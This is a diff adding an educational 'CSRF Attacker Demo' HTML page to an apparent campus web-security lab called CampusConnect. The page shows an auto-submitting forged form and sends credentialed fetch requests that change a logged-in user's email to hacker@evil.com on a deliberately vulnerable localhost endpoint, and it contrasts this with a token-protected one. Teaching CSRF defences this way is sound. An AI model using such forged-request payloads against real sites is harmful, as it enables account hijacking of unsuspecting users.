@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🏴‍☠️ Attacker Demo – CSRF Simulation</title>
+  <meta name="description" content="Standalone CSRF attacker demonstration page." />
+  <style>
+    /* ── Simple standalone styles (no shared CSS dependency) ── */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #1a0a0a;
+      color: #f8f8f8;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+    .attacker-wrapper {
+      max-width: 680px;
+      width: 100%;
+    }
+    .attacker-header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .attacker-logo {
+      font-size: 3rem;
+      margin-bottom: 0.5rem;
+    }
+    .attacker-title {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: #ef4444;
+    }
+    .attacker-sub {
+      font-size: 0.9rem;
+      color: #9ca3af;
+      margin-top: 0.3rem;
+    }
+    .card {
+      background: #2a1010;
+      border: 1px solid #7f1d1d;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+    }
+    .card h2 {
+      font-size: 1rem;
+      color: #ef4444;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .info-box {
+      background: #1f1f1f;
+      border: 1px solid #374151;
+      border-radius: 8px;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      font-size: 0.85rem;
+      color: #d1d5db;
+      line-height: 1.6;
+    }
+    .info-box code {
+      background: #111;
+      padding: 2px 5px;
+      border-radius: 3px;
+      font-family: monospace;
+      color: #f87171;
+    }
+    label {
+      display: block;
+      font-size: 0.8rem;
+      color: #9ca3af;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 0.4rem;
+    }
+    input[type="email"], input[type="text"] {
+      width: 100%;
+      padding: 0.6rem 0.8rem;
+      background: #111;
+      border: 1px solid #374151;
+      border-radius: 6px;
+      color: #f8f8f8;
+      font-size: 0.9rem;
+      margin-bottom: 1rem;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 0.75rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-attack {
+      background: linear-gradient(135deg, #dc2626, #991b1b);
+      color: white;
+    }
+    .btn-attack:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(220,38,38,0.4); }
+    .btn-safe { background: linear-gradient(135deg, #16a34a, #15803d); color: white; margin-top: 0.5rem; }
+    .btn-safe:hover { transform: translateY(-1px); }
+    .btn-nav {
+      background: #374151;
+      color: white;
+      margin-top: 0.5rem;
+      text-align: center;
+      text-decoration: none;
+      display: block;
+      padding: 0.6rem;
+      border-radius: 8px;
+      font-size: 0.85rem;
+    }
+    .result-box {
+      margin-top: 1rem;
+      padding: 1rem;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      display: none;
+    }
+    .result-success { background: rgba(220,38,38,0.2); border: 1px solid #dc2626; }
+    .result-blocked  { background: rgba(22,163,74,0.2);  border: 1px solid #16a34a; }
+    .result-title  { font-weight: 700; margin-bottom: 0.4rem; font-size: 1rem; }
+    .result-explain { color: #d1d5db; line-height: 1.6; margin-top: 0.5rem; }
+    .code-preview {
+      background: #0d0d0d;
+      border: 1px solid #374151;
+      border-radius: 6px;
+      padding: 0.8rem;
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #86efac;
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin: 0.5rem 0 1rem;
+    }
+    .sep { height: 1px; background: #374151; margin: 1rem 0; }
+    .steps { counter-reset: step; padding: 0; }
+    .step {
+      counter-increment: step;
+      display: flex;
+      gap: 0.75rem;
+      align-items: flex-start;
+      margin-bottom: 0.75rem;
+      font-size: 0.85rem;
+      color: #d1d5db;
+    }
+    .step-num {
+      background: #ef4444;
+      color: white;
+      border-radius: 50%;
+      width: 22px;
+      height: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+      font-weight: 700;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .badge-warn { color: #fbbf24; font-weight: 700; }
+    .badge-safe { color: #34d399; font-weight: 700; }
+  </style>
+</head>
+<body>
+
+  <div class="attacker-wrapper">
+
+    <!-- Header -->
+    <div class="attacker-header">
+      <div class="attacker-logo">🏴‍☠️</div>
+      <div class="attacker-title">CSRF Attacker Demo</div>
+      <div class="attacker-sub">
+        CampusConnect – Web Server Security Lab · Educational Use Only
+      </div>
+    </div>
+
+    <!-- What is this? -->
+    <div class="card">
+      <h2>ℹ️ What is This Page?</h2>
+      <div class="info-box">
+        This page simulates an <strong>attacker-controlled website</strong> hosted on a different origin.
+        In a real CSRF attack, the victim visits a page like this (hosted on <code>evil.com</code>)
+        while being logged in to CampusConnect. The page automatically submits a hidden form to the
+        CampusConnect server. Because the browser sends the session cookie automatically,
+        the server processes the forged request.<br/><br/>
+        <strong>Prerequisite:</strong> You must be logged in to CampusConnect at <code>localhost:3000</code> in another tab.
+      </div>
+
+      <!-- How it works steps -->
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div>Victim logs in to CampusConnect at <code>localhost:3000</code>. Browser stores session cookie.</div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div>Attacker tricks victim into visiting this page (e.g. via email link, social media).</div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div>This page auto-submits a hidden form to <code>localhost:3000/api/settings/email-vuln</code>.</div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div>Browser includes victim's session cookie. <span class="badge-warn">Server accepts the forged request!</span></div>
+        </div>
+        <div class="step">
+          <div class="step-num">5</div>
+          <div>Victim's email is changed to <code>hacker@evil.com</code> without their knowledge.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Vulnerable demo ── -->
+    <div class="card">
+      <h2>⚠️ Attack 1: Vulnerable Endpoint (No CSRF Protection)</h2>
+
+      <div class="info-box">
+        Sends a forged POST to <code>/api/settings/email-vuln</code> which has
+        <strong>no CSRF token validation</strong>. If you are logged in, the request will succeed.
+      </div>
+
+      <label>Attacker's forged form HTML (what a real attacker would use):</label>
+      <div class="code-preview" id="vuln-form-preview"></div>
+
+      <label>Email to inject:</label>
+      <input type="email" id="vuln-email" value="hacker@evil.com" oninput="updatePreviews()" />
+
+      <button class="btn btn-attack" onclick="sendVulnAttack()">
+        ⚠️ Send Forged Request (Vulnerable Endpoint)
+      </button>
+
+      <div class="result-box" id="vuln-result">
+        <div class="result-title" id="vuln-result-title"></div>
+        <div class="result-explain" id="vuln-result-explain"></div>
+      </div>
+    </div>
+
+    <!-- ── Secure demo ── -->
+    <div class="card">
+      <h2>✅ Attack 2: Secure Endpoint (CSRF Token Required)</h2>
+
+      <div class="info-box">
+        Sends the same forged POST to <code>/api/settings/email-safe</code> which
+        <strong>requires a valid CSRF token</strong>. The attacker cannot read the token
+        (Same-Origin Policy) so the forged request will be rejected.
+      </div>
+
+      <label>Attacker's forged form HTML (note: no CSRF token):</label>
+      <div class="code-preview" id="safe-form-preview"></div>
+
+      <label>Email to inject (will be blocked):</label>
+      <input type="email" id="safe-email" value="hacker@evil.com" oninput="updatePreviews()" />
+
+      <button class="btn btn-safe" onclick="sendSafeAttack()">
+        🛡️ Send Forged Request (Secure Endpoint)
+      </button>
+
+      <div class="result-box" id="safe-result">
+        <div class="result-title" id="safe-result-title"></div>
+        <div class="result-explain" id="safe-result-explain"></div>
+      </div>
+    </div>
+
+    <!-- Back link -->
+    <a href="/settings.html" class="btn-nav">← Back to CampusConnect Account Settings</a>
+    <a href="/dashboard.html" class="btn-nav" style="margin-top:0.5rem;">🏠 Back to Dashboard</a>
+
+  </div><!-- /attacker-wrapper -->
+
+  <script>
+    /**
+     * csrf-attacker.html
+     *
+     * This page demonstrates a CSRF attack from an attacker's perspective.
+     *
+     * Both attacks send a forged POST request WITHOUT a CSRF token:
+     *   - Vulnerable endpoint → accepts the request (email changed)
+     *   - Secure endpoint     → rejects the request (CSRF token mismatch)
+     */
+
+    // Update code previews on page load and when email inputs change
+    document.addEventListener('DOMContentLoaded', updatePreviews);
+
+    function updatePreviews() {
+      const vulnEmail = document.getElementById('vuln-email').value || 'hacker@evil.com';
+      const safeEmail = document.getElementById('safe-email').value || 'hacker@evil.com';
+
+      document.getElementById('vuln-form-preview').textContent =
+        `<!-- Attacker's page (evil.com) -->\n`
+        + `<form action="http://localhost:3000/api/settings/email-vuln"\n`
+        + `      method="POST">\n`
+        + `  <input name="email" value="${vulnEmail}" />\n`
+        + `  <!-- NO CSRF token! -->\n`
+        + `</form>\n`
+        + `<script>document.forms[0].submit();<\/script>`;
+
+      document.getElementById('safe-form-preview').textContent =
+        `<!-- Attacker's page (evil.com) -->\n`
+        + `<form action="http://localhost:3000/api/settings/email-safe"\n`
+        + `      method="POST">\n`
+        + `  <input name="email" value="${safeEmail}" />\n`
+        + `  <!-- Attacker CANNOT read the CSRF token from victim's session -->\n`
+        + `  <!-- so the csrf_token field is missing -->\n`
+        + `</form>\n`
+        + `<script>document.forms[0].submit();<\/script>`;
+    }
+
+    // ── Vulnerable attack ────────────────────────────────────────────────────
+    async function sendVulnAttack() {
+      const email  = document.getElementById('vuln-email').value.trim() || 'hacker@evil.com';
+      const result = document.getElementById('vuln-result');
+      const title  = document.getElementById('vuln-result-title');
+      const expl   = document.getElementById('vuln-result-explain');
+
+      title.textContent = 'Sending forged request…';
+      result.className  = 'result-box result-success';
+      result.style.display = '';
+
+      try {
+        // ⚠️  Forged request: same-origin fetch without a CSRF token
+        const res = await fetch('http://localhost:3000/api/settings/email-vuln', {
+          method:      'POST',
+          credentials: 'include',  // includes session cookie — this is what makes CSRF dangerous
+          headers:     { 'Content-Type': 'application/json' },
+          body:        JSON.stringify({ email })
+          // No csrf_token — just like a real forged request
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          title.textContent   = `⚠️ CSRF ATTACK SUCCEEDED! Email changed to "${data.newEmail}"`;
+          result.className    = 'result-box result-success';
+          expl.textContent    = data.explanation || 'The server accepted the forged request because it did not check for a CSRF token.';
+        } else {
+          title.textContent   = '🤔 Request returned an error: ' + data.message;
+          result.className    = 'result-box result-blocked';
+          expl.textContent    = 'The server rejected the request (maybe you are not logged in?). Log in to CampusConnect in another tab and try again.';
+        }
+      } catch (err) {
+        title.textContent   = '❌ Could not connect to CampusConnect';
+        result.className    = 'result-box result-blocked';
+        expl.textContent    = 'Make sure the CampusConnect server is running at localhost:3000.';
+      }
+    }
+
+    // ── Secure attack ────────────────────────────────────────────────────────
+    async function sendSafeAttack() {
+      const email  = document.getElementById('safe-email').value.trim() || 'hacker@evil.com';
+      const result = document.getElementById('safe-result');
+      const title  = document.getElementById('safe-result-title');
+      const expl   = document.getElementById('safe-result-explain');
+
+      title.textContent = 'Sending forged request…';
+      result.className  = 'result-box result-success';
+      result.style.display = '';
+
+      try {
+        // ⚠️  Forged request: missing csrf_token — this is what the attacker sends
+        const res = await fetch('http://localhost:3000/api/settings/email-safe', {
+          method:      'POST',
+          credentials: 'include',
+          headers:     { 'Content-Type': 'application/json' },
+          body:        JSON.stringify({ email })
+          // No csrf_token — attacker cannot read it from the victim's session
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          title.textContent = `⚠️ Unexpectedly succeeded: ${data.message}`;
+          result.className  = 'result-box result-success';
+          expl.textContent  = data.explanation || '';
+        } else {
+          title.textContent = `✅ CSRF ATTACK BLOCKED! ${data.message}`;
+          result.className  = 'result-box result-blocked';
+          expl.textContent  = data.explanation || 'The server rejected the request because the CSRF token was missing or invalid.';
+        }
+      } catch (err) {
+        title.textContent   = '❌ Could not connect to CampusConnect';
+        result.className    = 'result-box result-blocked';
+        expl.textContent    = 'Make sure the CampusConnect server is running at localhost:3000.';
+      }
+    }
+  </script>
+</body>
+</html>
